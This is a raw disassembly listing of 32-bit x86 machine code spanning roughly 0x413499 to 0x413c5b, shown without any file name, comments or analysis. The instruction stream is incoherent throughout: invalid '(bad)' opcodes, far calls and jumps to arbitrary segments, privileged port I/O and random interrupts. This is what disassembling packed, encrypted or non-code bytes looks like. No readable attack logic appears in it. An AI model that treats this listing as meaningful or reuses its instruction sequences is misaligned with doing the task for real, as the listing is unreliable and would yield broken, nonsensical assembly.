  413499:	int3   
  41349a:	cmp    DWORD PTR [edx],ebp
  41349c:	leave  
  41349d:	ss and al,0xa9
  4134a0:	cs jl  0x4134b7
  4134a3:	mov    DWORD PTR ds:0xc76c0c5e,ebx
  4134a9:	fwait
  4134aa:	std    
  4134ab:	mov    dh,0x7a
  4134ae:	dec    esp
  4134af:	(bad)  
  4134b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b1:	jb     0x413446
  4134b3:	ins    BYTE PTR es:[edi],dx
  4134b4:	dec    edx
  4134b5:	dec    edx
  4134b6:	xchg   edx,eax
  4134b7:	jecxz  0x4134ba
  4134b9:	retf   0xb12e
  4134bc:	adc    eax,0x341317a7
  4134c1:	(bad)  
  4134c3:	adc    BYTE PTR [ecx-0x6de649bc],0x93
  4134ca:	ret    
  4134cb:	and    DWORD PTR [esp+edi*4+0x27],edi
  4134cf:	pop    edi
  4134d0:	leave  
  4134d1:	sub    esi,DWORD PTR [ebp+0x4e544c46]
  4134d7:	or     eax,0x2e76b5ff
  4134dc:	dec    edi
  4134dd:	xchg   edi,eax
  4134de:	sbb    DWORD PTR [esi-0x12],ebp
  4134e1:	xor    al,0x24
  4134e3:	pop    esi
  4134e4:	sbb    DWORD PTR [eax+0x38],esp
  4134e7:	out    dx,eax
  4134e8:	aam    0x7a
  4134ea:	(bad)  
  4134eb:	and    DWORD PTR [edx+eax*2+0x73],eax
  4134ef:	adc    BYTE PTR [eax],ah
  4134f1:	pop    ss
  4134f2:	add    ebx,ebx
  4134f4:	adc    BYTE PTR [eax-0x2712d6c4],cl
  4134fa:	in     al,0xba
  4134fc:	stos   BYTE PTR es:[edi],al
  4134fd:	dec    ecx
  4134fe:	sbb    esp,DWORD PTR [eax]
  413500:	lds    esi,FWORD PTR [edx+edi*1-0x5c57b3e8]
  413507:	xor    edx,edi
  413509:	pop    ss
  41350a:	adc    BYTE PTR [edx-0x45],0x30
  41350e:	jo     0x413541
  413510:	pushf  
  413511:	add    al,0x9e
  413513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413514:	test   dh,cl
  413516:	adc    ebp,ebp
  413518:	sar    BYTE PTR [ecx],1
  41351a:	enter  0x3f89,0x1e
  41351e:	cmp    al,0x2b
  413520:	or     al,0xcb
  413522:	and    eax,DWORD PTR [edx]
  413524:	sar    BYTE PTR [eax],1
  413526:	ja     0x4134dc
  413528:	cmp    cl,BYTE PTR [esi-0x1b]
  41352b:	adc    al,BYTE PTR [ebx+0x6e]
  41352e:	fs sti 
  413530:	cdq    
  413531:	call   0x46c5:0x7af3768a
  413538:	out    0xe8,al
  41353a:	mov    cl,0x87
  41353c:	cmc    
  41353d:	sbb    dh,BYTE PTR [edi]
  41353f:	mov    dh,BYTE PTR fs:[ecx+0x51]
  413543:	in     eax,dx
  413544:	ror    BYTE PTR [edi],1
  413546:	(bad)  
  413548:	call   0x16e:0xed9aa8a
  41354f:	mov    ebp,0x212d901f
  413554:	and    esi,ecx
  413556:	xlat   BYTE PTR ds:[ebx]
  413557:	leave  
  413558:	jnp    0x413538
  41355a:	cdq    
  41355b:	in     al,0xaf
  41355d:	sub    BYTE PTR [ebx-0x23],bl
  413560:	add    eax,0x34cc70ae
  413565:	mov    ebp,0x66cf2062
  41356a:	push   ebp
  41356b:	inc    esi
  41356c:	or     DWORD PTR [edi+eax*8+0x2],esi
  413570:	lea    ecx,[ecx-0x2c]
  413573:	and    ebx,DWORD PTR [eax]
  413575:	cmp    al,0x29
  413577:	fldcw  WORD PTR [eax-0x6e]
  41357a:	cmp    al,0x5c
  41357c:	inc    eax
  41357d:	mov    ah,0xc1
  41357f:	push   cs
  413580:	cld    
  413581:	dec    edx
  413582:	jp     0x413544
  413584:	test   DWORD PTR [ebx+eax*4],esp
  413587:	add    ebx,DWORD PTR [ebx+edi*4+0x2c]
  41358b:	xchg   esp,eax
  41358c:	(bad)  
  41358d:	shl    BYTE PTR [edx+0x7f],1
  413590:	or     DWORD PTR [ecx+0x4f],0x49
  413594:	mov    al,0x1
  413596:	fwait
  413597:	inc    esi
  413598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413599:	cdq    
  41359a:	jmp    0x595b3ce8
  41359f:	test   esp,edx
  4135a1:	pushf  
  4135a2:	imul   edi,esp,0x7756a2d7
  4135a8:	jb     0x4135d0
  4135aa:	sbb    eax,0x883caf60
  4135af:	inc    ecx
  4135b0:	lock sbb eax,DWORD PTR [ebx+edx*4]
  4135b4:	jmp    0x5f72:0x43fdeb00
  4135bb:	ret    
  4135bc:	pushf  
  4135bd:	imul   edi,DWORD PTR [edi+0x41],0xffffffff
  4135c1:	mul    DWORD PTR [ebx+0x19]
  4135c4:	cmp    al,0x2e
  4135c6:	enter  0xf800,0xcf
  4135ca:	and    DWORD PTR [esi+edi*2+0xb],0x70
  4135cf:	jp     0x413591
  4135d1:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135d3:	xor    bl,BYTE PTR [ebp-0x64]
  4135d6:	adc    al,0xf7
  4135d8:	loope  0x4135d5
  4135da:	jp     0x413636
  4135dc:	sbb    eax,0x4b82fac7
  4135e1:	in     al,dx
  4135e2:	shl    ecx,0x6f
  4135e5:	jb     0x41357b
  4135e7:	fdivrp st(5),st
  4135e9:	pop    ebx
  4135ea:	sbb    eax,0xec56e4c5
  4135ef:	pop    edx
  4135f0:	push   cs
  4135f1:	(bad)  
  4135f2:	jp     0x413626
  4135f4:	inc    edx
  4135f5:	shl    DWORD PTR [esi-0x5324a2c3],1
  4135fb:	in     eax,dx
  4135fc:	or     eax,0x64559d8b
  413601:	dec    edi
  413602:	xchg   ebx,eax
  413603:	xchg   edx,eax
  413604:	not    dh
  413606:	addr16 int 0xf2
  413609:	pushf  
  41360a:	jno    0x413645
  41360c:	and    BYTE PTR [ecx+0x531122e8],ch
  413612:	sub    edi,DWORD PTR [eax-0x44]
  413615:	lock push ecx
  413617:	lea    ecx,[edi-0x26877191]
  41361d:	sub    dl,BYTE PTR [edi-0x4d75da32]
  413623:	add    edi,DWORD PTR [esi+0x66]
  413626:	add    al,bh
  413628:	retf   
  413629:	mov    bl,0x52
  41362b:	or     al,0x4c
  41362d:	add    al,0xda
  41362f:	hlt    
  413630:	fstp   st(7)
  413632:	bound  ebp,QWORD PTR [ebx]
  413634:	aad    0x41
  413636:	cmc    
  413637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413638:	xor    eax,0xa6e96305
  41363d:	adc    bh,ch
  41363f:	adc    eax,0x1cd8adb7
  413644:	retf   0x80ef
  413647:	nop
  413648:	and    al,0x97
  41364a:	or     BYTE PTR ds:0x61d7f33f,bl
  413650:	int    0xb4
  413652:	or     eax,0xd93b5ca5
  413657:	aam    0xeb
  413659:	retf   
  41365a:	shl    BYTE PTR [edx],cl
  41365c:	sbb    eax,0xa9eb071c
  413661:	xchg   DWORD PTR [esi],ebp
  413663:	stos   BYTE PTR es:[edi],al
  413664:	or     eax,0xf6e21adb
  413669:	mov    al,0xc2
  41366b:	pop    ss
  41366c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41366d:	mov    al,0x8d
  41366f:	and    eax,0x20b00263
  413674:	pop    eax
  413675:	jbe    0x413687
  413677:	dec    DWORD PTR [ebx]
  413679:	sar    DWORD PTR [esi],0x8
  41367c:	ficom  DWORD PTR [ebx-0x75]
  41367f:	repnz xchg ecx,eax
  413681:	fs es int3 
  413684:	fistp  DWORD PTR [edx-0x15278328]
  41368a:	test   al,0x21
  41368c:	out    dx,eax
  41368d:	xor    al,0xd1
  41368f:	pop    ds
  413690:	push   ss
  413691:	xor    esi,ebp
  413693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413694:	sub    DWORD PTR [esi],ebp
  413696:	call   0x23e5:0x395f6b6c
  41369d:	loope  0x4136bd
  41369f:	inc    DWORD PTR [ebp+0x6306f59a]
  4136a5:	cdq    
  4136a6:	cmp    eax,0x759dbdc3
  4136ab:	ds mov edi,0xded3d1d1
  4136b1:	out    0x59,al
  4136b3:	xor    DWORD PTR [eax],0x6c
  4136b6:	jecxz  0x4136cc
  4136b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b9:	push   ss
  4136ba:	dec    esp
  4136bb:	clc    
  4136bc:	ins    DWORD PTR es:[edi],dx
  4136bd:	adc    al,0x23
  4136bf:	inc    ebp
  4136c0:	xchg   BYTE PTR [esi+edi*1+0x3243118e],ah
  4136c7:	rcl    dl,0x18
  4136ca:	cmp    edi,DWORD PTR [edx+0x431f636a]
  4136d0:	mov    ah,0x27
  4136d2:	leave  
  4136d3:	sti    
  4136d4:	and    eax,0xb72cb252
  4136d9:	aam    0xcf
  4136db:	cld    
  4136dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136dd:	push   cs
  4136de:	pop    esp
  4136df:	and    ch,ah
  4136e1:	adc    ecx,edx
  4136e3:	pop    es
  4136e4:	popa   
  4136e5:	jns    0x4136e5
  4136e7:	mov    dl,0x50
  4136e9:	or     bl,BYTE PTR [ebp+0x401dd4bf]
  4136ef:	shl    BYTE PTR [edi],cl
  4136f1:	aaa    
  4136f2:	inc    ebp
  4136f3:	pushf  
  4136f4:	cmc    
  4136f5:	mov    ebx,eax
  4136f7:	cmp    bh,0x42
  4136fa:	dec    ebp
  4136fb:	in     al,0xd5
  4136fd:	xor    al,0x8b
  4136ff:	cmp    ebx,DWORD PTR [edx+eiz*8+0x3b]
  413703:	push   ds
  413704:	sub    esi,eax
  413706:	je     0x4136f1
  413708:	sbb    DWORD PTR [edi-0x583ecb12],eax
  41370e:	pop    edx
  41370f:	sub    bh,BYTE PTR [edi-0x11]
  413712:	mov    esi,ebx
  413714:	push   0x4
  413716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413718:	daa    
  413719:	repnz adc al,0x2f
  41371c:	dec    esi
  41371d:	in     eax,dx
  41371e:	leave  
  41371f:	dec    edi
  413720:	dec    edi
  413721:	xor    BYTE PTR [eax+0x78],al
  413724:	lea    ebx,[edi+esi*8-0x26b5f4e9]
  41372b:	jbe    0x41378d
  41372d:	add    al,0x57
  41372f:	add    BYTE PTR [esi],bl
  413731:	std    
  413732:	sbb    al,0x63
  413734:	jo     0x413710
  413736:	rol    BYTE PTR ds:0x93388469,0xa4
  41373d:	sub    dh,BYTE PTR [edi]
  41373f:	fistp  WORD PTR [eax+eax*8+0x5e]
  413743:	sar    BYTE PTR [edx],1
  413745:	jp     0x4137a7
  413747:	dec    esi
  413748:	dec    edx
  413749:	int    0x92
  41374b:	fwait
  41374c:	inc    edx
  41374d:	repnz (bad) 
  41374f:	mov    dh,0x93
  413751:	pop    ebp
  413752:	push   esp
  413753:	sbb    eax,0x143d550c
  413758:	popf   
  413759:	dec    edx
  41375a:	das    
  41375b:	xor    eax,0xcc67c2b3
  413760:	test   eax,0x5c02a809
  413765:	dec    eax
  413766:	fisttp WORD PTR [edx-0x7e]
  413769:	sahf   
  41376a:	imul   edi,DWORD PTR [eax],0xfffffff3
  41376d:	in     al,0xe9
  41376f:	fisubr WORD PTR [edx]
  413771:	mov    BYTE PTR ds:0x83b8274c,0x1f
  413778:	jbe    0x413786
  41377a:	mov    edi,0xe21125a3
  41377f:	lahf   
  413780:	xchg   ebp,eax
  413781:	jmp    0x1760:0xf0531c7
  413788:	scas   eax,DWORD PTR es:[edi]
  413789:	xor    DWORD PTR [edi-0x42],0x3d
  41378d:	lock adc BYTE PTR [esp+edx*1],al
  413791:	fmul   QWORD PTR [ecx+esi*2]
  413794:	cmp    ebp,DWORD PTR [esi-0x3d92db97]
  41379a:	sbb    BYTE PTR [edx+0x4e],0xb9
  41379e:	mov    edx,0xa883e8e0
  4137a3:	shr    eax,cl
  4137a5:	pop    ss
  4137a6:	pop    esp
  4137a7:	aam    0xe1
  4137a9:	retf   
  4137aa:	mov    bh,0x86
  4137ac:	pushf  
  4137ad:	dec    ecx
  4137ae:	addr16 iret 
  4137b0:	jmp    0x5e11:0x1a73d9b5
  4137b7:	wbinvd 
  4137b9:	or     dl,ch
  4137bb:	(bad)  
  4137bc:	adc    bh,BYTE PTR [edx]
  4137be:	dec    esp
  4137bf:	sbb    al,0x31
  4137c1:	shl    DWORD PTR [esi+0x567235e6],1
  4137c7:	cdq    
  4137c8:	push   es
  4137c9:	stc    
  4137ca:	sahf   
  4137cb:	dec    ebx
  4137cc:	call   0x8e63424c
  4137d1:	inc    ebp
  4137d2:	mov    eax,ds:0xfbe71f04
  4137d7:	popa   
  4137d8:	jl     0x4137f1
  4137da:	mov    edi,0x90db8b5e
  4137df:	mov    ebp,0x878b12b4
  4137e4:	rcr    DWORD PTR [eax+ecx*4],cl
  4137e7:	pop    ds
  4137e8:	out    dx,al
  4137e9:	pop    es
  4137ea:	pop    ebx
  4137eb:	daa    
  4137ec:	inc    ecx
  4137ed:	mov    BYTE PTR [ecx+esi*1],cl
  4137f0:	xor    BYTE PTR [ebp-0x28],ah
  4137f3:	mov    ah,0x6a
  4137f5:	ds dec ebp
  4137f7:	mov    cl,0xd4
  4137f9:	and    BYTE PTR [edi-0x34eb2bce],dh
  4137ff:	popf   
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	aam    0x37
  413803:	ret    0xde81
  413806:	and    bh,BYTE PTR [ecx]
  413808:	les    eax,FWORD PTR [ebx+esi*4]
  41380b:	inc    esi
  41380c:	pop    edi
  41380d:	mov    ds:0x92df7ed3,eax
  413812:	push   cs
  413813:	lds    ecx,FWORD PTR [eax-0x4f]
  413816:	and    eax,0xdfa0cbbf
  41381b:	jg     0x413815
  41381d:	mov    DWORD PTR [eax+eiz*2+0x1b577b40],ecx
  413824:	add    dl,bl
  413826:	jb     0x41381f
  413828:	xchg   ecx,esi
  41382a:	xor    ecx,DWORD PTR [ebx-0x1c]
  41382d:	sub    BYTE PTR [ecx],ch
  41382f:	rol    DWORD PTR [eax+0x4e],1
  413832:	push   edi
  413833:	imul   esp,DWORD PTR [ebx],0xffffffa6
  413836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413837:	sbb    DWORD PTR [edx-0x741097a2],edx
  41383d:	test   ah,cl
  41383f:	mov    ds:0x33f52b3f,al
  413844:	sub    bh,dl
  413846:	outs   dx,DWORD PTR ds:[esi]
  413847:	sub    al,0x91
  413849:	fwait
  41384a:	and    eax,0x520353cb
  41384f:	dec    esi
  413850:	loope  0x413874
  413852:	aaa    
  413853:	mov    ds:0xdbf12075,eax
  413858:	push   DWORD PTR [eax+0x6f]
  41385b:	inc    ecx
  41385c:	mov    dh,0xfa
  41385e:	dec    esp
  41385f:	xchg   edx,eax
  413860:	mov    al,ds:0x6a0e7313
  413865:	jmp    0x413841
  413867:	pusha  
  413868:	add    BYTE PTR [edi+0x17],dl
  41386b:	cmp    bl,bh
  41386d:	xchg   esi,eax
  41386e:	cmp    DWORD PTR [ebx+0x45],esp
  413871:	call   0xedae:0x5ee02946
  413878:	push   esi
  413879:	push   esi
  41387a:	pop    edi
  41387b:	(bad)  
  41387c:	cld    
  41387d:	pusha  
  41387e:	push   ebx
  41387f:	add    DWORD PTR [edi],ebp
  413881:	aam    0x22
  413883:	in     al,dx
  413884:	gs push esp
  413886:	pop    eax
  413887:	inc    esi
  413888:	push   ebp
  413889:	cmp    DWORD PTR [ecx+0x62a4098e],0x96dc137f
  413893:	in     al,0x27
  413895:	adc    BYTE PTR [ebx+0x2],0x2f
  413899:	imul   eax,DWORD PTR [ebx+eiz*2+0x2b5714af],0x4c8efb
  4138a4:	sub    eax,DWORD PTR [ecx+ecx*8]
  4138a7:	mov    al,0x86
  4138a9:	adc    eax,DWORD PTR [edx+0x13]
  4138ac:	sar    bl,cl
  4138ae:	into   
  4138af:	push   esi
  4138b0:	and    ch,BYTE PTR [eax]
  4138b2:	sti    
  4138b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138b4:	mov    ch,0x54
  4138b6:	ss enter 0xd6c5,0xf0
  4138bb:	adc    DWORD PTR [ecx+0xb],0x10
  4138bf:	mov    al,BYTE PTR [esi-0x217f4e9]
  4138c5:	sub    ah,cl
  4138c7:	pop    edi
  4138c8:	retf   
  4138c9:	and    BYTE PTR [esi-0x2d2ccca5],bh
  4138cf:	mov    ds:0x9474c6cd,eax
  4138d4:	cmp    BYTE PTR [edi],al
  4138d6:	xor    eax,0xa1c4ea2f
  4138db:	add    al,0xc6
  4138dd:	inc    ecx
  4138de:	dec    ecx
  4138df:	test   BYTE PTR [ebx-0x14337d55],dl
  4138e5:	mov    al,ds:0x795745e1
  4138ea:	sbb    al,0x53
  4138ec:	cwde   
  4138ed:	mul    esi
  4138ef:	cmp    BYTE PTR [eax-0x1995b531],ch
  4138f5:	enter  0x2f0b,0x95
  4138f9:	pop    ebx
  4138fa:	(bad)  
  4138fb:	stc    
  4138fc:	pusha  
  4138fd:	arpl   cx,di
  4138ff:	les    ecx,FWORD PTR [edx]
  413901:	hlt    
  413902:	jmp    0x5e8a:0xfd76f7b4
  413909:	ja     0x413977
  41390b:	sahf   
  41390c:	(bad)  
  41390d:	dec    ebx
  41390e:	out    0x90,eax
  413910:	movd   mm0,ebp
  413913:	push   eax
  413914:	push   eax
  413915:	dec    eax
  413916:	xchg   ebx,eax
  413917:	hlt    
  413918:	das    
  413919:	ja     0x4138f1
  41391b:	xor    al,0x8d
  41391d:	or     DWORD PTR [ebx+0x53],esp
  413920:	into   
  413921:	or     ebx,edx
  413923:	(bad)  
  413924:	pop    ebp
  413925:	lods   eax,DWORD PTR ds:[esi]
  413926:	jg     0x413989
  413928:	inc    edi
  413929:	das    
  41392a:	inc    bp
  41392c:	or     DWORD PTR [ebp+0x79],0x4
  413930:	mov    edi,0x2a5b3535
  413935:	in     eax,0xd5
  413937:	retf   0x804d
  41393a:	add    eax,0xe8b17b54
  41393f:	and    eax,0xfb04c069
  413944:	mov    bl,0x6b
  413946:	or     BYTE PTR [edx],ch
  413948:	mov    ebx,0xe0e78263
  41394d:	lock jecxz 0x413914
  413950:	popa   
  413951:	sub    BYTE PTR [ebx],ch
  413953:	rol    ebp,cl
  413955:	ret    
  413956:	or     BYTE PTR [ecx+0x4a27dbcf],dh
  41395c:	sar    DWORD PTR [esi-0x690d3d19],cl
  413962:	loop   0x4139bc
  413964:	(bad)  
  413965:	xor    eax,0x85fbefee
  41396a:	mov    fs,ecx
  41396c:	scas   al,BYTE PTR es:[edi]
  41396d:	inc    ebx
  41396e:	cmp    al,0xaf
  413970:	pop    ecx
  413971:	js     0x41397b
  413973:	mov    WORD PTR [ecx+esi*4],ds
  413976:	inc    BYTE PTR [ecx+edx*8]
  413979:	fcomp  QWORD PTR [ecx-0x47]
  41397c:	mov    esi,0xb3b45969
  413981:	jle    0x4139a2
  413983:	xor    al,0x3
  413985:	les    esi,FWORD PTR [edi-0x32]
  413988:	inc    edi
  413989:	lds    eax,FWORD PTR ds:0x8e73e8c1
  41398f:	test   al,0x95
  413991:	cs aam 0x18
  413994:	ins    DWORD PTR es:[edi],dx
  413995:	cmp    esp,DWORD PTR [ebx]
  413997:	adc    eax,0x83b8a19b
  41399c:	scas   eax,DWORD PTR es:[edi]
  41399d:	add    al,0xe0
  41399f:	lods   al,BYTE PTR ds:[esi]
  4139a0:	cmp    bl,bl
  4139a2:	repz xor eax,0xcd775519
  4139a8:	retf   0xed6b
  4139ab:	jg     0x413944
  4139ad:	sub    edi,DWORD PTR [ecx+ecx*4+0x3aee9faa]
  4139b4:	adc    al,0x6b
  4139b6:	cwde   
  4139b7:	out    dx,al
  4139b8:	xor    eax,0xa58b7468
  4139bd:	mov    ecx,0x5387aeb3
  4139c2:	xchg   edi,eax
  4139c3:	add    dh,cl
  4139c5:	jle    0x413a39
  4139c7:	sub    al,0xfe
  4139c9:	icebp  
  4139ca:	mov    bl,ch
  4139cc:	pop    ss
  4139cd:	js     0x413981
  4139cf:	dec    edx
  4139d0:	sub    BYTE PTR [ecx+0x3c784dab],ah
  4139d6:	add    dh,BYTE PTR [esp+edx*8]
  4139d9:	(bad)  
  4139da:	idiv   dh
  4139dc:	jnp    0x413a08
  4139de:	push   ss
  4139df:	and    BYTE PTR ds:0x47cec4ec,0x9
  4139e6:	push   ecx
  4139e7:	test   eax,ebx
  4139e9:	je     0x413a64
  4139eb:	add    BYTE PTR [edx+edi*4+0x792f77c0],cl
  4139f2:	push   0xd6611cc9
  4139f7:	sbb    ecx,ebx
  4139f9:	pop    esp
  4139fa:	cld    
  4139fb:	pop    ss
  4139fc:	jnp    0x4139e4
  4139fe:	mov    esi,0x78ea346c
  413a03:	xchg   esi,eax
  413a04:	sub    eax,0xd2569a13
  413a09:	pop    ss
  413a0a:	ret    0x2174
  413a0d:	jb     0x4139b7
  413a0f:	pop    esp
  413a10:	cmc    
  413a11:	inc    ebx
  413a12:	sti    
  413a13:	dec    edi
  413a14:	pop    ebp
  413a15:	adc    eax,0x1ced74c8
  413a1a:	jmp    0x413a99
  413a1c:	pop    ebp
  413a1d:	dec    ebp
  413a1e:	jne    0x413a63
  413a20:	aam    0xda
  413a22:	fptan  
  413a24:	fstp   QWORD PTR [ebp-0x11be3f61]
  413a2a:	(bad)  
  413a2b:	out    0x16,eax
  413a2d:	cmp    DWORD PTR [ebp+0x5e],esp
  413a30:	cmc    
  413a31:	in     al,0x48
  413a33:	shr    ah,cl
  413a35:	pop    ds
  413a36:	inc    esi
  413a37:	pop    ds
  413a38:	sbb    al,0x65
  413a3a:	call   0xe899:0x65eb3b54
  413a41:	hlt    
  413a42:	add    cl,BYTE PTR [eax-0x29343e4b]
  413a48:	dec    ebx
  413a49:	push   ebx
  413a4a:	mov    al,ds:0xef81131c
  413a4f:	or     DWORD PTR [edx+0x682b3712],esi
  413a55:	clc    
  413a56:	retf   
  413a57:	sbb    al,0xaf
  413a59:	sub    ebp,ecx
  413a5b:	test   al,0xb8
  413a5d:	cmp    DWORD PTR [edx],ebx
  413a5f:	call   0xacacc4c2
  413a64:	and    DWORD PTR [eax],edx
  413a66:	push   esi
  413a67:	xchg   BYTE PTR [eax+0xe4e731f],dl
  413a6d:	xor    esi,DWORD PTR ds:0xfcc7db5e
  413a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a74:	std    
  413a75:	xor    esi,DWORD PTR [eax]
  413a77:	ret    
  413a78:	call   0xc356:0xf9be23cd
  413a7f:	add    al,0x88
  413a81:	sub    cl,BYTE PTR ds:[edx+0x56]
  413a85:	pop    edx
  413a86:	fst    DWORD PTR [edi-0x3d]
  413a89:	rcr    DWORD PTR [ebp-0x123821f5],0xe5
  413a90:	stos   DWORD PTR es:[edi],eax
  413a91:	mov    ecx,0xdc01b6e9
  413a96:	je     0x413aa6
  413a98:	int3   
  413a99:	ss je  0x413ae2
  413a9c:	shl    BYTE PTR [ecx+0x648da79b],cl
  413aa2:	xchg   DWORD PTR [edx+eiz*1+0x1bc5f785],ecx
  413aa9:	aam    0x6f
  413aab:	jbe    0x413a78
  413aad:	cmc    
  413aae:	mov    DWORD PTR [edi+edx*4-0x3e27d9b9],eax
  413ab5:	fst    DWORD PTR ds:0x14481081
  413abb:	xchg   ebp,eax
  413abc:	loope  0x413aef
  413abe:	out    dx,al
  413abf:	je     0x413ad1
  413ac1:	popa   
  413ac2:	mov    WORD PTR [edi+0x35cb9112],es
  413ac8:	inc    ebx
  413ac9:	mov    al,0x7a
  413acb:	xchg   ecx,eax
  413acc:	adc    BYTE PTR [esi-0x12c3f9cd],ah
  413ad2:	addr16 jg 0x413ae9
  413ad5:	adc    DWORD PTR [eax+ebx*1-0x1],eax
  413ad9:	lahf   
  413ada:	adc    DWORD PTR [ebp+0x6a808e1d],edi
  413ae0:	lds    ecx,FWORD PTR [ebp+eiz*8+0x49]
  413ae4:	outs   dx,BYTE PTR ds:[esi]
  413ae5:	pop    esp
  413ae6:	les    eax,FWORD PTR [ebx+0xadd5077]
  413aec:	repnz cmp DWORD PTR [ecx],esi
  413aef:	(bad)
  413af3:	sub    edx,ebp
  413af5:	adc    ch,BYTE PTR [ecx+0x23e1ced5]
  413afb:	pop    edx
  413afc:	cli    
  413afd:	(bad)  
  413afe:	push   ds
  413aff:	sbb    al,0x69
  413b01:	pop    edx
  413b02:	adc    al,0x75
  413b04:	and    BYTE PTR [eax-0x41],0xef
  413b08:	repz js 0x413b13
  413b0b:	mov    dh,0xbd
  413b0d:	xor    eax,0xf0742085
  413b12:	dec    esi
  413b13:	pop    edi
  413b14:	pop    eax
  413b15:	jo     0x413af5
  413b17:	shr    BYTE PTR [edx],1
  413b19:	mov    bl,ch
  413b1b:	scas   al,BYTE PTR es:[edi]
  413b1c:	leave  
  413b1d:	dec    edi
  413b1e:	pushf  
  413b1f:	adc    DWORD PTR [edx+0x62],esp
  413b22:	aaa    
  413b23:	nop
  413b24:	shr    BYTE PTR [edi],cl
  413b26:	dec    edx
  413b27:	pop    ebx
  413b28:	loopne 0x413b11
  413b2a:	sbb    WORD PTR fs:[ebx+edi*1-0x188ac0cc],sp
  413b33:	sbb    DWORD PTR [eax+0x168b9e9c],ebx
  413b39:	or     BYTE PTR [eax-0x5d],0xa4
  413b3d:	mov    ebp,0x907fa3
  413b42:	int3   
  413b43:	adc    al,0xfe
  413b45:	push   ss
  413b46:	ja     0x413b57
  413b48:	in     al,dx
  413b49:	xor    DWORD PTR [ebp+eax*8-0x7c],0xeb53ef62
  413b51:	mov    ?,WORD PTR [eax]
  413b53:	push   ecx
  413b54:	popf   
  413b55:	dec    edx
  413b56:	inc    esi
  413b57:	ins    BYTE PTR es:[edi],dx
  413b58:	jg     0x413bc9
  413b5a:	dec    ebx
  413b5b:	xadd   DWORD PTR [ebx-0x34],ebp
  413b5f:	push   eax
  413b60:	jb     0x413b78
  413b62:	push   0x8dec2269
  413b67:	mov    ah,0xcf
  413b69:	sbb    edi,esi
  413b6b:	inc    edi
  413b6c:	sbb    eax,ebp
  413b6e:	mov    BYTE PTR [edi+0x42],ah
  413b71:	mov    edi,0x3946c7d7
  413b76:	pop    ss
  413b77:	call   0x1216:0xd5491443
  413b7e:	adc    al,0x82
  413b80:	lods   al,BYTE PTR ds:[esi]
  413b81:	dec    edx
  413b82:	call   0xefb5:0x955b844c
  413b89:	jns    0x413bad
  413b8b:	dec    ebp
  413b8c:	mov    bl,0x17
  413b8e:	mov    eax,0xc39ebbaa
  413b93:	popa   
  413b94:	xor    BYTE PTR [esi-0x6fb1cd70],ah
  413b9a:	jae    0x413b7a
  413b9c:	dec    esi
  413b9d:	jg     0x413b46
  413b9f:	mov    al,BYTE PTR ds:[ebx-0x2d570334]
  413ba6:	scas   al,BYTE PTR es:[edi]
  413ba7:	ffree  st(3)
  413ba9:	mov    dl,0x28
  413bab:	sbb    DWORD PTR [edi+0x5c],ecx
  413bae:	shr    DWORD PTR [edx-0x1935837f],1
  413bb4:	(bad)  
  413bb6:	out    0x9c,eax
  413bb8:	mov    eax,ds:0x8d88bfbc
  413bbd:	inc    esp
  413bbe:	dec    esi
  413bbf:	fcom   QWORD PTR [ecx]
  413bc1:	daa    
  413bc2:	scas   eax,DWORD PTR es:[edi]
  413bc3:	mov    ah,0xf5
  413bc5:	mov    ch,0x93
  413bc7:	add    DWORD PTR [eax-0x8],esi
  413bca:	in     eax,dx
  413bcb:	cmp    BYTE PTR [esi],al
  413bcd:	cmp    DWORD PTR ds:0x1ca4e3e7,ecx
  413bd3:	sbb    edi,DWORD PTR [ecx-0x15]
  413bd6:	push   ebp
  413bd7:	repnz mov DWORD PTR [ebp+ebp*4-0x35],0x48954378
  413be0:	inc    ebp
  413be1:	xor    eax,0xdf5f175d
  413be6:	adc    al,BYTE PTR [ecx+0x33]
  413be9:	add    DWORD PTR [ecx],ebx
  413beb:	sahf   
  413bec:	outs   dx,BYTE PTR ds:[esi]
  413bed:	leave  
  413bee:	mov    edx,0x6360ada
  413bf3:	mov    WORD PTR [ebx-0x1b7c8907],fs
  413bf9:	mov    edi,0x6d1ed6bf
  413bfe:	lahf   
  413bff:	mov    bh,0x6b
  413c01:	rol    DWORD PTR [ecx+ebx*1],1
  413c04:	scas   al,BYTE PTR es:[edi]
  413c05:	sbb    dh,dl
  413c07:	popa   
  413c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c09:	sub    al,0x18
  413c0b:	cmp    al,0x4b
  413c0d:	and    esp,esi
  413c0f:	shl    BYTE PTR [edi-0x46031bdf],0x88
  413c16:	dec    edi
  413c17:	xchg   ebp,eax
  413c18:	xor    al,0xd5
  413c1b:	mov    al,0xf3
  413c1e:	adc    dh,BYTE PTR [ebx+0x60dc5dc8]
  413c24:	rcl    DWORD PTR [edx-0x2716dbaf],cl
  413c2a:	push   es
  413c2b:	lods   al,BYTE PTR ds:[esi]
  413c2c:	sbb    al,0x8b
  413c2e:	imul   ebx,DWORD PTR [ecx+0x59],0xffffff89
  413c32:	xlat   BYTE PTR ds:[ebx]
  413c33:	pop    edi
  413c34:	cmc    
  413c35:	fwait
  413c36:	and    al,0x8e
  413c38:	lods   al,BYTE PTR ds:[esi]
  413c39:	push   ds
  413c3a:	dec    esp
  413c3b:	sub    BYTE PTR [eax+0x46f55a8b],al
  413c41:	add    DWORD PTR [esi],esp
  413c43:	mov    esi,0x111f80c9
  413c48:	ds pop ebp
  413c4a:	mov    ebx,DWORD PTR [ebx-0x64]
  413c4d:	gs out 0x9f,al
  413c50:	mov    esp,0x66e9b434
  413c55:	std    
  413c56:	push   ebp
  413c57:	lahf   
  413c58:	test   dl,dl
  413c5a:	in     al,dx
  413c5b:	dec    edi
